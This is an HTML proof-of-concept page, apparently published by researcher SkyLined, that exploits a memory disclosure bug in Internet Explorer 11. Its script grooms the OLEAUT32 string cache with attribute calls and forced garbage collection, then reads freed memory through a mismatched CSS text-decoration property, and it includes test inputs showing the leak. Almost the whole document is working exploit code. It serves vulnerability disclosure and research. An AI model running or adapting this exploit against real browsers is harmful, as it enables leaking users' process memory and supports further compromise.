<!DOCTYPE html>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<script>
  // This PoC attempts to exploit a memory disclosure bug in Microsoft Internet
  // Explorer 11. See http://blog.skylined.nl/20161109001.html for details.
  var sSetPropertyName = "textdecorationblink", //textDecorationLineThrough, textDecorationLineNone, textDecorationOverline, textDecorationUnderline
      sGetPropertyName = "text-decoration",
      sPropertyValue = "blink"; 
  function fbTest(sTest) {
    var o = document.createElement("x");
    // Cleanup, potentially fill OLEAUT32 BSTR cache
    CollectGarbage();
    // Empty the smallest BSTR bucket of the OLEAUT32 cache and defragement the small chunks heap.
    o.setAttribute("a", "1");
    o.setAttribute("b", "2");
    o.setAttribute("c", "3");
    o.setAttribute("d", "4");
    o.setAttribute("e", "5");
    o.setAttribute("f", "6");
    // Add the <sTest> BSTR to the smallest bucket of the OLEAUT32 BSTR cache.
    o.setAttribute("x", sTest);
    o.removeAttribute("x");
    // reused the <sTest> memory and overwrite the first two chars with 'x' and '\0', then read from offset +8
    o.style.setProperty(sSetPropertyName, "x");
    var bResult = o.style.getPropertyValue(sGetPropertyName) == sPropertyValue;
    alert(JSON.stringify(sTest) + "=>" + bResult);
  };
  fbTest("12345");          // true
  fbTest("1234\0");         // false
  fbTest("1234");           // false
  fbTest("123");            // (AV on x64 if page heap enabled).
  // This work by SkyLined is licensed under a Creative Commons
  // Attribution-Non-Commercial 4.0 International License.
</script>
